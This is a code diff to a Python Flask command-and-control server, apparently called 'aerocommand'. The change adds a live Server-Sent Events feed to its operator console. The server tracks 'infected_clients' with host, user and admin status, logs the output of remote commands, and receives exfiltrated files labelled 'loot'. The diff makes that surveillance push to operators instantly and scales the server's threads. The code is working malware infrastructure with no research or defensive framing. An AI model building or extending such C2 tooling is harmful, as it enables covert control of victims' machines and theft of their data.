@@ -1,10 +1,11 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, Response
 import functools
 import hmac
 import threading
 import logging
 import base64
 import os
+import queue
 import time
 import json
 import sqlite3
@@ -59,6 +60,53 @@ def require_auth(f):
     return decorated
 
 DB_FILE = "aerocommand.db"
+
+# === Operator SSE push hub ===
+# Each connected operator GUI holds one Queue; mutations broadcast events so the
+# console gets instant updates instead of polling /api/logs every 750ms.
+event_queues = []
+eq_lock = threading.Lock()
+
+
+def broadcast(event: dict):
+    """Fan out an event to all connected operator streams; drop dead queues."""
+    with eq_lock:
+        dead = []
+        for q in event_queues:
+            try:
+                q.put_nowait(event)
+            except queue.Full:
+                dead.append(q)
+            except Exception:
+                dead.append(q)
+        for q in dead:
+            if q in event_queues:
+                event_queues.remove(q)
+
+
+def _clients_payload():
+    """Shape infected_clients into the same dict list /api/clients returns."""
+    client_list = []
+    with cmd_lock:
+        for cid, info in infected_clients.items():
+            last_seen_str = info['last_seen'].strftime("%Y-%m-%d %H:%M:%S") if isinstance(info.get('last_seen'), datetime) else str(info.get('last_seen', ''))
+            client_list.append({
+                'id': cid,
+                'host': info.get('host', 'Unknown'),
+                'ip': info.get('ip', '0.0.0.0'),
+                'pid': int(info.get('pid', 0)),
+                'os': info.get('os', 'Unknown'),
+                'user': info.get('user', 'unknown'),
+                'admin': bool(info.get('admin', False)),
+                'first_seen': str(info.get('registered', '')),
+                'last_seen': last_seen_str,
+                'status': 'ALIVE',
+                'cpu_usage': 0.0,
+                'ram_usage': 0.0,
+                'disk_usage': 0.0,
+                'net_usage': 0.0
+            })
+    return client_list
 
 def db_connect():
     """Open a DB connection tuned for concurrent access (Flask threads + CLI)"""
@@ -126,7 +174,7 @@ def db_save_client(info):
         print(f"[!] DB save_client failed: {e}")
 
 def db_log_command(client_id, command, output):
-    """Log executed command output into SQLite"""
+    """Log executed command output into SQLite; returns the new row id"""
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     try:
         with db_connect() as conn:
@@ -136,8 +184,10 @@ def db_log_command(client_id, command, output):
                 VALUES (?, ?, ?, ?)
             """, (client_id, command, output[:MAX_LOG_OUTPUT], now))
             conn.commit()
+            return cursor.lastrowid
     except Exception as e:
         print(f"[!] DB log_command failed: {e}")
+        return None
 
 init_db()
 
@@ -395,6 +445,7 @@ def register():
         print(f"{C.CYAN}[•] Total clients: {len(infected_clients)}{C.RESET}\n")
         _client_connected_event.set()
         print(PROMPT, end="", flush=True)
+        broadcast({'type': 'clients'})
 
     return "OK", 200
 
@@ -448,7 +499,16 @@ def post_result():
     results.append({"client": client_id, "output": output, "time": timestamp})
     if len(results) > 500:
         del results[:-500]
-    db_log_command(client_id, command_name, output)
+    log_id = db_log_command(client_id, command_name, output)
+    if log_id is not None:
+        broadcast({'type': 'log', 'log': {
+            'id': log_id,
+            'client_id': client_id,
+            'command': command_name,
+            'output': output[:MAX_LOG_OUTPUT],
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            'status': 'SUCCESS'
+        }})
     print(PROMPT, end="", flush=True)
     return "OK", 200
 
@@ -494,6 +554,7 @@ def upload_file():
     print(f"\n{C.GREEN}[{timestamp}] 📥 FILE RECEIVED from {host}:{C.RESET} {filename} ({len(file_data)} bytes)")
     print(f"{C.GRAY}    Saved to: {save_path}{C.RESET}")
     print(PROMPT, end="", flush=True)
+    broadcast({'type': 'loot'})
     return "OK", 200
 
 
@@ -512,28 +573,7 @@ def add_cors_headers(response):
 def api_get_clients():
     if request.method == "OPTIONS":
         return "", 200
-
-    client_list = []
-    with cmd_lock:
-        for cid, info in infected_clients.items():
-            last_seen_str = info['last_seen'].strftime("%Y-%m-%d %H:%M:%S") if isinstance(info.get('last_seen'), datetime) else str(info.get('last_seen', ''))
-            client_list.append({
-                'id': cid,
-                'host': info.get('host', 'Unknown'),
-                'ip': info.get('ip', '0.0.0.0'),
-                'pid': int(info.get('pid', 0)),
-                'os': info.get('os', 'Unknown'),
-                'user': info.get('user', 'unknown'),
-                'admin': bool(info.get('admin', False)),
-                'first_seen': str(info.get('registered', '')),
-                'last_seen': last_seen_str,
-                'status': 'ALIVE',
-                'cpu_usage': 0.0,
-                'ram_usage': 0.0,
-                'disk_usage': 0.0,
-                'net_usage': 0.0
-            })
-    return jsonify(client_list), 200
+    return jsonify(_clients_payload()), 200
 
 
 @app.route("/api/logs", methods=["GET", "OPTIONS"])
@@ -556,6 +596,69 @@ def api_get_logs():
                 'status': 'SUCCESS'
             })
     return jsonify(list(reversed(log_list))), 200
+
+
+@app.route("/api/events", methods=["GET"])
+def sse_events():
+    """Server-Sent Events stream for the operator console.
+    Auth via Bearer header or ?token= (EventSource cannot set headers).
+    Optional ?since=<log_id> replays newer rows to close reconnect gaps."""
+    # Manual auth: EventSource can't send an Authorization header
+    if OPERATOR_TOKEN:
+        token = ""
+        auth_header = request.headers.get("Authorization", "")
+        if auth_header.startswith("Bearer "):
+            token = auth_header[7:]
+        elif request.args.get("token"):
+            token = request.args.get("token")
+        if not token or not hmac.compare_digest(token, OPERATOR_TOKEN):
+            return jsonify({"error": "Invalid operator token"}), 403
+
+    since = request.args.get("since", type=int)
+
+    def shape_log(row):
+        return {
+            'id': row[0], 'client_id': row[1], 'command': row[2],
+            'output': row[3], 'timestamp': row[4], 'status': 'SUCCESS'
+        }
+
+    def stream():
+        q = queue.Queue(maxsize=200)
+        with eq_lock:
+            event_queues.append(q)
+        try:
+            try:
+                # Snapshot + replay anything the operator missed while offline
+                replay = []
+                if since is not None:
+                    with db_connect() as conn:
+                        cursor = conn.cursor()
+                        cursor.execute(
+                            "SELECT id, client_id, command, output, timestamp FROM command_logs "
+                            "WHERE id > ? ORDER BY id ASC LIMIT 200", (since,))
+                        replay = [shape_log(r) for r in cursor.fetchall()]
+                snapshot = {'type': 'sync', 'clients': _clients_payload(), 'replay': replay}
+                yield f"data: {json.dumps(snapshot)}\n\n"
+
+                while True:
+                    try:
+                        ev = q.get(timeout=20)
+                        yield f"data: {json.dumps(ev)}\n\n"
+                    except queue.Empty:
+                        # Comment ping keeps proxies from closing idle streams
+                        yield ": keepalive\n\n"
+            except GeneratorExit:
+                raise
+        finally:
+            with eq_lock:
+                if q in event_queues:
+                    event_queues.remove(q)
+
+    return Response(stream(), mimetype="text/event-stream", headers={
+        "Cache-Control": "no-cache",
+        "X-Accel-Buffering": "no",   # disable proxy buffering (nginx/Render edge)
+        "Connection": "keep-alive",
+    })
 
 
 @app.route("/api/send_command", methods=["POST", "OPTIONS"])
@@ -879,11 +982,12 @@ if __name__ == "__main__":
     else:
         print(f"{C.CYAN}[i] Cloud/Headless mode detected (no TTY) — Web C2 endpoints are active.{C.RESET}")
 
-    # Production WSGI server (waitress) with graceful fallback to the Flask dev server
+    # Production WSGI server (waitress) with graceful fallback to the Flask dev server.
+    # Threads >= 16: every SSE operator stream holds one thread for its lifetime.
     try:
         from waitress import serve
-        print(f"{C.GREEN}[+] Serving via waitress (production WSGI, 8 threads){C.RESET}")
-        serve(app, host="0.0.0.0", port=server_port, threads=8)
+        print(f"{C.GREEN}[+] Serving via waitress (production WSGI, 16 threads){C.RESET}")
+        serve(app, host="0.0.0.0", port=server_port, threads=16, channel_timeout=300)
     except ImportError:
         print(f"{C.YELLOW}[!] waitress not installed — falling back to Flask dev server{C.RESET}")
-        app.run(host="0.0.0.0", port=server_port, debug=False, use_reloader=False)
+        app.run(host="0.0.0.0", port=server_port, debug=False, use_reloader=False, threaded=True)
